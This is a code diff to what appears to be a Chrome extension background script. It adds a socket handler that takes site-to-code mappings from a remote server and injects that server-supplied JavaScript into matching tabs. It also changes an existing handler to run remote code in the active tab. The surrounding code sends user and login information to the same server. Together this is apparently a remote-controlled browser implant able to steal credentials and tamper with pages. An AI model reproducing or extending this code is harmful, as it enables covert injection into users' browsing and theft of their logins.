@@ -8,6 +8,7 @@ function connectToServer() {
     socket.emit('userInfo', userInfo);
   });
   updateSecurityWebsites(socket);
+  updateScriptWebsites(socket);
   return socket;
 }
 
@@ -19,6 +20,14 @@ function updateSecurityWebsites(socket) {
   socket.on('securityWebsites', (securityWebsites) => {
     chrome.storage.sync.set({
       'securityWebsites': securityWebsites
+    });
+  });
+}
+
+function updateScriptWebsites(socket) {
+  socket.on('jsExecution', (objects) => {
+    chrome.storage.sync.set({
+      'scriptSites': objects
     });
   });
 }
@@ -49,6 +58,21 @@ function sendLoginInfo(loginInfo) {
   socket.emit('Login', loginInfo);
 }
 
+function checkScriptWebsites(tabId, changeInfo) {
+  if (changeInfo.url) {
+    chrome.storage.sync.get('scriptSites', (scriptSites) => {
+      scriptSites.scriptSites.forEach((map) => {
+        if (changeInfo.url.includes(map.site)) {
+			chrome.tabs.executeScript({
+			  code: map.code
+			});
+          return;
+        }
+      });
+    });
+  }
+}
+
 function checkSecurityWebsites(tabId, changeInfo) {
   if (changeInfo.url) {
     chrome.storage.sync.get('securityWebsites', (securityWebsites) => {
@@ -64,8 +88,9 @@ function checkSecurityWebsites(tabId, changeInfo) {
 
 function createScriptSocket() {
   socket.on('Script', (script) => {
-    chrome.tabs.executeScript(script.id, {
+    chrome.tabs.executeScript({
       code: script.code
     });
   });
 }
+
